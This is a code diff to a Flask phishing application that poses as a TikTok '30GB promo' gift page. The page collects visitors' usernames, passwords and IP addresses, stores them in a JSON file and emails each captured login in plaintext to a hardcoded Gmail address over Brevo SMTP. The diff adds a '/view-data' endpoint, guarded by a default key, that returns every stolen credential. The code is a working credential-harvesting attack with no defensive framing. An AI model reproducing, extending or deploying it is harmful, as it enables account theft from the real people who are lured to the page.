@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
-# Brevo SMTP via Render Secret File | Separate Login & From Email | No Ngrok
+# Credentials saved to JSON + Secret View Route | No Ngrok
 # =============================================================================
 
 import os
@@ -11,51 +11,20 @@ import threading
 from email.message import EmailMessage
 from datetime import datetime
 from pathlib import Path
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, abort
 
 # -------------------- Configuration --------------------
 DATA_FILE = "captured_credentials.json"
+VIEW_SECRET = os.environ.get('VIEW_SECRET', 'changeme123')  # Protect data view
 
-# Default SMTP settings (Brevo)
-SMTP_SERVER = "smtp-relay.brevo.com"
-SMTP_PORT = 587
-SMTP_USE_SSL = False
-EMAIL_SENDER = ""      # SMTP login username (e.g., a86d2e001@smtp-brevo.com)
-EMAIL_PASSWORD = ""    # SMTP master key
-EMAIL_FROM = ""        # Verified sender email (appears in "From:" field)
-EMAIL_RECEIVER = "ah3418678@gmail.com"
-
-# Load from Render Secret File if it exists (recommended for production)
-SECRET_FILE = "/etc/secrets/brevo.env"
-if Path(SECRET_FILE).exists():
-    with open(SECRET_FILE, 'r') as f:
-        for line in f:
-            line = line.strip()
-            if line and not line.startswith('#') and '=' in line:
-                key, value = line.split('=', 1)
-                if key == "SMTP_SERVER":
-                    SMTP_SERVER = value
-                elif key == "SMTP_PORT":
-                    SMTP_PORT = int(value)
-                elif key == "SMTP_USE_SSL":
-                    SMTP_USE_SSL = value.lower() == "true"
-                elif key == "EMAIL_SENDER":
-                    EMAIL_SENDER = value
-                elif key == "EMAIL_PASSWORD":
-                    EMAIL_PASSWORD = value
-                elif key == "EMAIL_FROM":
-                    EMAIL_FROM = value
-                elif key == "EMAIL_RECEIVER":
-                    EMAIL_RECEIVER = value
-else:
-    # Fallback to environment variables (for local testing)
-    SMTP_SERVER = os.environ.get('SMTP_SERVER', SMTP_SERVER)
-    SMTP_PORT = int(os.environ.get('SMTP_PORT', SMTP_PORT))
-    SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
-    EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
-    EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
-    EMAIL_FROM = os.environ.get('EMAIL_FROM', '')
-    EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', EMAIL_RECEIVER)
+# SMTP Settings (optional – can be ignored if not working)
+SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp-relay.brevo.com')
+SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
+SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
+EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
+EMAIL_FROM = os.environ.get('EMAIL_FROM', '')
+EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -602,17 +571,15 @@ def save_credentials(username, password, ip_address):
         logger.error(f"Failed to save credentials: {e}")
 
 def send_email_alert(subject, body):
-    if not EMAIL_SENDER or not EMAIL_PASSWORD:
-        logger.error("❌ EMAIL_SENDER or EMAIL_PASSWORD not set")
-        return False
-    if not EMAIL_FROM:
-        logger.error("❌ EMAIL_FROM not set (must be a verified sender in Brevo)")
+    """Optional email alert – failure is logged but not fatal."""
+    if not EMAIL_SENDER or not EMAIL_PASSWORD or not EMAIL_FROM:
+        logger.warning("Email not configured – skipping alert")
         return False
     try:
         msg = EmailMessage()
         msg.set_content(body)
         msg['Subject'] = subject
-        msg['From'] = EMAIL_FROM          # Verified sender email
+        msg['From'] = EMAIL_FROM
         msg['To'] = EMAIL_RECEIVER
 
         if SMTP_USE_SSL:
@@ -627,7 +594,7 @@ def send_email_alert(subject, body):
         logger.info("✅ Email alert sent")
         return True
     except Exception as e:
-        logger.error(f"❌ Email failed: {e}")
+        logger.error(f"❌ Email failed (ignored): {e}")
         return False
 
 # -------------------- Routes --------------------
@@ -646,6 +613,8 @@ def login():
             return render_template_string(PHISH_HTML, error="Both fields required", success=False)
 
         save_credentials(username, password, ip)
+
+        # Attempt email alert (non‑blocking)
         subject = f"🎁 TikTok 30GB Login - {username}"
         body = f"""
         New Login Captured:
@@ -655,8 +624,25 @@ def login():
         Pass: {password}
         """
         threading.Thread(target=send_email_alert, args=(subject, body)).start()
+
         return render_template_string(PHISH_HTML, success=True)
     return render_template_string(PHISH_HTML, success=False)
+
+@app.route('/view-data')
+def view_data():
+    """Protected endpoint to view captured credentials."""
+    key = request.args.get('key', '')
+    if key != VIEW_SECRET:
+        abort(403)  # Forbidden
+    try:
+        if os.path.exists(DATA_FILE):
+            with open(DATA_FILE, 'r') as f:
+                data = json.load(f)
+        else:
+            data = []
+        return {"count": len(data), "credentials": data}
+    except Exception as e:
+        return {"error": str(e)}, 500
 
 @app.route('/test-email')
 def test_email():
